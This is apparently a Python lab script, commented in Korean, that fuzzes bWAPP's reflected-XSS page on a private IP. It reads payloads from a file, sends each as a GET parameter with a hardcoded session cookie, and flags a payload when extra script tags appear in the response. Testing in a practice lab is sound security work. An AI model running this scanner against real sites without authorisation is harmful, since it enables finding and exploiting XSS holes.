from time \
import sleep
import requests
from selenium import webdriver
from bs4 import BeautifulSoup
from selenium.webdriver.common.alert import Alert

## file read
f = open("C:/Users/okopo/Desktop/Python_Script/XSS_Pathern.txt", 'r')  # XSS Pathern
lines = f.readlines()  # Read XSS Pathern
number = 0
# Session Start
for payload in lines:
    sleep(0.10)  # 적절한 속도 유지
    cookies = {'PHPSESSID': '10143c4a2d88497a409d8d754cd10f35;', 'security_level': '1'}
    data = {'firstname': 'XssCheck',
            'lastname': payload,
            'form': 'submit'
            }
    # Attack Start
    res = requests.get('http://192.168.186.174/bWAPP/xss_get.php', cookies=cookies, params=data)
    if res.status_code != 200:
        print("연결실패")

    html = res.text
    result = BeautifulSoup(html, 'html.parser')
    script = result.find_all('script')  # payload 삽입 후 파싱된 html소스코드 중 <script> 태그 가져오기

    count = 0
    for xss in script:
        print("공격 시도 횟수 : %d" % number)
        number = number + 1
        count = count + 1

        if count > 1:  # XSS Refleted  페이지 내에 <script>태그가 1개 존재함 따라서 2개라면 <script>태그 정상 삽입
            print("파싱된 실제 문자열 : %s" % xss)
            print("XSS 취약점 의심 페이로드 : %s" % payload)
    script = ''
f.close()